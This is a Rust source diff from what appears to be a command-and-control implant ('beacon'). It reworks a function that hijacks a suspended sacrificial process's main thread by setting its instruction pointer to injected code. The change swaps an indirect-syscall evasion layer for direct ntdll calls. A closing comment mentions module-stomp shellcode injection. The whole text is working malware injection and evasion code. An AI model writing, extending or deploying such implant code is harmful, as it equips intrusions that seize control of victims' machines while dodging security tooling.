@@ -375,58 +375,60 @@ fn isolated_startup(si: &mut [u8; 104], pipe_write: *mut c_void) {
 /// it suspended is the correct cleanup.
 ///
 /// # Safety
-/// Cross-process thread-context ops via the indirect-syscall runtime.
-/// Single-threaded beacon context.
+/// Cross-process thread-context ops via DIRECT ntdll calls (same mechanism
+/// as tp.rs section delivery). NOT the indirect-syscall runtime: cross
+/// process context get/set/resume proved unreliable through the SSN
+/// trampoline in some environments (child never resumes → 60s timeout,
+/// while direct calls work — empirically on windows-latest). Single-threaded
+/// beacon context.
 pub unsafe fn hijack_main_thread(
     proc: &mut SacrificialProcess,
     entry: u64,
     arg: u64,
 ) -> Result<(), &'static str> {
-    // Ensure the runtime is up: the rundll32 selftest path never runs the
-    // beacon entry's init sequence (init_global is idempotent).
-    unsafe { nyx_implant_core::syscalls::init_global() };
-    let rt =
-        nyx_implant_core::syscalls::global().ok_or("indirect syscall runtime not initialized")?;
+    type NtGetCtx = unsafe extern "system" fn(usize, *mut u8) -> i32;
+    type NtSetCtx = unsafe extern "system" fn(usize, *mut u8) -> i32;
+    type NtResume = unsafe extern "system" fn(usize, *mut u32) -> i32;
+    let get_ctx: NtGetCtx = unsafe {
+        core::mem::transmute::<usize, NtGetCtx>(
+            export_addr(b"ntdll.dll", b"NtGetContextThread")
+                .ok_or("NtGetContextThread unresolved")?,
+        )
+    };
+    let set_ctx: NtSetCtx = unsafe {
+        core::mem::transmute::<usize, NtSetCtx>(
+            export_addr(b"ntdll.dll", b"NtSetContextThread")
+                .ok_or("NtSetContextThread unresolved")?,
+        )
+    };
+    let resume: NtResume = unsafe {
+        core::mem::transmute::<usize, NtResume>(
+            export_addr(b"ntdll.dll", b"NtResumeThread").ok_or("NtResumeThread unresolved")?,
+        )
+    };
 
     let mut ctx = AlignedContext([0u8; 1232]);
     ctx.0[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
-    let get = unsafe {
-        nyx_implant_core::syscalls::nt_get_context_thread(
-            rt,
-            proc.main_thread as usize,
-            ctx.0.as_mut_ptr() as usize,
-        )
-    };
-    nt_status_ok(get, "NtGetContextThread failed")?;
+    let st = unsafe { get_ctx(proc.main_thread as usize, ctx.0.as_mut_ptr()) };
+    if st < 0 {
+        return Err("NtGetContextThread failed");
+    }
 
     ctx.0[0xF8..0xF8 + 8].copy_from_slice(&entry.to_le_bytes()); // Rip
     ctx.0[0x80..0x80 + 8].copy_from_slice(&arg.to_le_bytes()); // Rcx
     ctx.0[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
-    let set = unsafe {
-        nyx_implant_core::syscalls::nt_set_context_thread(
-            rt,
-            proc.main_thread as usize,
-            ctx.0.as_mut_ptr() as usize,
-        )
-    };
-    nt_status_ok(set, "NtSetContextThread failed")?;
+    let st = unsafe { set_ctx(proc.main_thread as usize, ctx.0.as_mut_ptr()) };
+    if st < 0 {
+        return Err("NtSetContextThread failed");
+    }
 
     let mut prev_count: u32 = 0;
-    let resume = unsafe {
-        nyx_implant_core::syscalls::nt_resume_thread(rt, proc.main_thread as usize, &mut prev_count)
-    };
-    nt_status_ok(resume, "NtResumeThread failed")?;
+    let st = unsafe { resume(proc.main_thread as usize, &mut prev_count) };
+    if st < 0 {
+        return Err("NtResumeThread failed");
+    }
     proc.mark_resumed();
     Ok(())
-}
-
-/// Map an NT status (Option-wrapped, negative = failure) to a unit Result —
-/// the get/set/resume checks above share this exact gate.
-fn nt_status_ok(status: Option<i32>, err: &'static str) -> Result<(), &'static str> {
-    match status {
-        Some(s) if s >= 0 => Ok(()),
-        _ => Err(err),
-    }
 }
 
 /// Module-stomp inject `shellcode` into a fresh `spawn_to` process. Creates the
